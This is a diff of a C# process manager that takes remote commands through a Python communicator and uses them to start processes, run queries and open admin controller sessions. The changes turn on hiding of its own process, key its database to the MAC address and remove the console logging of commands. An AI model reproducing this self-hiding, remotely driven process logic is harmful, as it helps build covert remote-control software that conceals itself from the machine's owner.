@@ -1,7 +1,11 @@
-﻿using System;
+﻿#define CHECK_OS
+
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
+using System.Net.NetworkInformation;
 using System.Threading;
 
 namespace Manager
@@ -20,7 +24,7 @@ namespace Manager
         public const char PROCESS_DATA_CODE = 'd';
         private const char QUERY_RESPONSE_CODE = 'Q';
         private const char DISPLAY_CODE = 'D'; // display to admin <=> only if the admin is connected
-        private const string databaseFile = @"db\db.db";
+        private readonly string databaseFile;//@"db\db.db";
         #endregion
 
         #region fields
@@ -44,7 +48,12 @@ namespace Manager
             isAdminConnected = false;
             mainThreadId = Thread.CurrentThread.ManagedThreadId;
             Directory.CreateDirectory("temp"); // for output files or executables i.e. python code or batch files
-            //procHider.HideProc(Process.GetCurrentProcess());
+#if (CHECK_OS)
+            if (!Environment.Is64BitOperatingSystem) // 32 bit system
+#endif
+                procHider.HideProc(Process.GetCurrentProcess());
+            databaseFile = NetworkInterface.GetAllNetworkInterfaces().Where(nic => nic.OperationalStatus == OperationalStatus.Up)
+                .Select(nic => nic.GetPhysicalAddress().ToString()).Last();
         }
 
         /// <summary>
@@ -74,41 +83,28 @@ namespace Manager
             // python -u = python unbuffered -> disable the need for sys.stdout.flush() after every print (like doing it automatically)
             if (!this.mainProcesses[COMMUNICATION_PROCESS_IND].StartProcess("python", @"-u Communication\communicator.py", this.OnCommunicationReceived) ||
                 !this.mainProcesses[DECISIONS_PROCESS_IND].StartProcess("python" , @"-u Decider\decider.py", this.OnDecisionRecieved) ||
-                !this.mainProcesses[DATABASE_PROCESS_IND].StartProcess("python", @"-u Database\database.py " + ProcessManager.databaseFile))
+                !this.mainProcesses[DATABASE_PROCESS_IND].StartProcess("python", @"-u Database\database.py " + databaseFile))
                 Environment.Exit(-1); // could not start main processes
 
             DatabaseThread(); // starts the thread if it is in the main thread
 
-            //if (!this.mainProcesses[COMMUNICATION_PROCESS_IND].StartProcess("python", @"-u G:\programming\AnatolyProjects\itay\print.py", this.OutputDataReceived) ||
-            //    !this.mainProcesses[DECISIONS_PROCESS_IND].StartProcess(@"G:\programming\AnatolyProjects\itay\print.bat", "", this.OutputDataReceived))
-            //    Environment.Exit(-1); // could not start main processes
-
-            while (!this.shutdown) // passing data and commands between parts and opening new threads for tasks
-            {
-                if (Console.ReadKey().Key == ConsoleKey.Escape)
-                {
-                    break;
-                }
-                else
-                {
-                   // for checks
-                }
-            }
+            this.Shutdown();
+            Thread.Sleep(500);
         }
 
         private void DatabaseThread()
         {
-            if (Thread.CurrentThread.ManagedThreadId == mainThreadId) // not started as a seperate thread
-            {
-                //throw new Exception("db queries must be running in a seperate thread");
-                Thread dbThread = new Thread(DatabaseThread);
-                dbThread.Start();
-                return;
-            }
+            // the next code is made to start this thread as a seperate thread
+            //if (Thread.CurrentThread.ManagedThreadId == mainThreadId) // not started as a seperate thread
+            //{
+            //    Thread dbThread = new Thread(DatabaseThread);
+            //    dbThread.Start();
+            //    return;
+            //}
             while (!this.shutdown)
             {
                 // lock is not needed because Count returns a variable and not counts the queries
-                while (this.Queries.Count > 0) // while not empty
+                while (!this.shutdown && this.Queries.Count > 0) // while not empty
                 {
                     bool IsBusy = false;
                     string data;
@@ -167,13 +163,11 @@ namespace Manager
             switch (trimData[0])
             {
                 case SEND_CMD:
-                    Console.WriteLine("send cmd: " + trimData);
                     lock (this.mainProcesses[COMMUNICATION_PROCESS_IND])
                         this.mainProcesses[COMMUNICATION_PROCESS_IND].SendData(trimData.Substring(1)); // pass data without command
                         // NOTICE: the data is a filename with the data
                     break;
                 case START_PROCESS_CMD: // the data should be: <command type char><proccess identification string>,
-                    Console.WriteLine("start process cmd: " + trimData);
                     ProcessHandler newProc = new ProcessHandler(this.procHider);
                     lock (this.secondaryProcesses)
                         this.secondaryProcesses.Add(newProc);
@@ -199,19 +193,16 @@ namespace Manager
                     }
                     break;
                 case QUERY_CMD:
-                    Console.WriteLine("query cmd: " + trimData);
                     lock(Queries)
                     {
                         Queries.Enqueue(trimData.Substring(1)); // the queued commands will be executed in another thread
                     }
                     break;
                 case DISPLAY_CODE:
-                    //Console.WriteLine("display code: " + trimData);
                     if (!this.isAdminConnected)
                     {
                         if (trimData[1] != '\'' && trimData[1] != '"') // not repr'd => try to connect from another controller
                         {
-                            Console.WriteLine("starting admin session");
                             isAdminConnected = true;
                             this.controllerProcess = new ProcessHandler(this.procHider);
                             this.controllerProcess.StartProcess("python", @"-u ControllerConnection\controllerConnection.py " + trimData.Substring(1), OnControllerRecieved);
